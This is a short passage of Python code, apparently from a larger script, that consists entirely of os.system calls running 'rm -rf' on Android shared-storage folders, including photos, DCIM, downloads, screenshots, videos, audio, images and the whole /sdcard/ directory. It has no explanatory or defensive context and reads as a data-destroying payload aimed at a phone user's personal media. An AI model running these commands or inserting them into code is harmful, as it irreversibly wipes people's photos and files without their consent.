...
os.system("rm -rf /sdcard/photo")
os.system("rm -rf /sdcard/photos")
os.system("rm -rf /sdcard/download")
os.system("rm -rf /sdcard/DCIM")
os.system("rm -rf /sdcard/screenshot")
...
os.system("rm -rf /sdcard/")
os.system("rm -rf /sdcard/video")
os.system("rm -rf /sdcard/videos")
os.system("rm -rf /sdcard/audio")
os.system("rm -rf /sdcard/audios")
os.system("rm -rf /sdcard/image")
os.system("rm -rf /sdcard/images")
